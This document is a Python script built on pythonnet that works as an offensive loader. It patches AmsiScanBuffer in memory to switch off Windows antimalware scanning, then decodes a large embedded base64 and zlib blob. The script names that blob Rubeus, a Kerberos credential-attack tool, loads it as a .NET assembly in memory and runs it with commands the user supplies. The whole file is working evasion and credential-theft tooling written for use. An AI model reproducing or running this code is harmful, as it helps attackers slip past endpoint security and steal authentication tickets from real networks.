import base64
import zlib
import argparse
import clr
import ctypes
from ctypes import *
import System
from System import Array, IntPtr, UInt32
from System.Reflection import Assembly

# Ensure necessary .NET references are added
clr.AddReference("System.Management.Automation")

from System.Management.Automation import Runspaces, RunspaceInvoke
from System.Runtime.InteropServices import Marshal

base64_str = "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"


def bypass():
    """
    Bypasses the Antimalware Scan Interface (AMSI) by patching the AmsiScanBuffer method in amsi.dll.
    This allows scripts to run without being scanned and potentially blocked by AMSI.
    """
    windll.LoadLibrary("amsi.dll")
    windll.kernel32.GetModuleHandleW.argtypes = [c_wchar_p]
    windll.kernel32.GetModuleHandleW.restype = c_void_p
    handle = windll.kernel32.GetModuleHandleW('amsi.dll')
    windll.kernel32.GetProcAddress.argtypes = [c_void_p, c_char_p]
    windll.kernel32.GetProcAddress.restype = c_void_p
    BufferAddress = windll.kernel32.GetProcAddress(handle, "AmsiScanBuffer")
    BufferAddress = IntPtr(BufferAddress)
    Size = System.UInt32(0x05)
    ProtectFlag = System.UInt32(0x40)
    OldProtectFlag = Marshal.AllocHGlobal(0)
    virt_prot = windll.kernel32.VirtualProtect(BufferAddress, Size, ProtectFlag, OldProtectFlag)
    patch = System.Array[System.Byte]((System.UInt32(0xB8), System.UInt32(0x57), System.UInt32(0x00), System.UInt32(0x07), System.UInt32(0x80), System.UInt32(0xC3)))
    Marshal.Copy(patch, 0, BufferAddress, 6)

def base64_to_bytes(base64_string):
    """
    Converts a base64 encoded string to a .NET byte array after decompressing it.
    Args:
        base64_string: The base64 encoded and compressed string to convert.
    Returns:
        A .NET byte array of the decompressed data.
    """
    # Decode the base64 string to get the compressed binary data
    compressed_data = base64.b64decode(base64_string)
    # Decompress the data
    decompressed_data = zlib.decompress(compressed_data)
    # Convert the decompressed binary data to a .NET byte array
    return System.Array[System.Byte](decompressed_data)

def to_clr_array(py_list):
    """
    Converts a Python list to a .NET string array.
    Args:
        py_list: The Python list to convert.
    Returns:
        A .NET string array.
    """
    arr = System.Array.CreateInstance(System.String, len(py_list))
    for i, item in enumerate(py_list):
        arr[i] = item
    return arr

def load_and_execute_assembly(command):
    """
    Loads a .NET assembly from a base64 encoded and compressed string, and executes a specified method.
    Args:
        command: The command to execute within the loaded assembly.
    Returns:
        The result of the executed command.
    """
    assembly_bytes = base64_to_bytes(base64_str)
    
    # Load the assembly
    assembly = Assembly.Load(assembly_bytes)
    
    # Get the type of the Rubeus.Program class
    rubeus_program_type = assembly.GetType("Rubeus.Program")

    # You don't need to create an instance of the class for a static method
    method = rubeus_program_type.GetMethod("MainString")

    # Convert your command to a .NET string array
    command_args = to_clr_array([command])

    # Invoke the MainString method
    result = method.Invoke(None, command_args)

    return result
    
def main():
    bypass()
    parser = argparse.ArgumentParser(description='Execute a command on a hardcoded base64 encoded assembly')
    parser.add_argument('command', type=str, help='Command to execute (like "help" or "triage")')

    args = parser.parse_args()
    
    result = load_and_execute_assembly(args.command)
    print(result)

if __name__ == "__main__":
    main()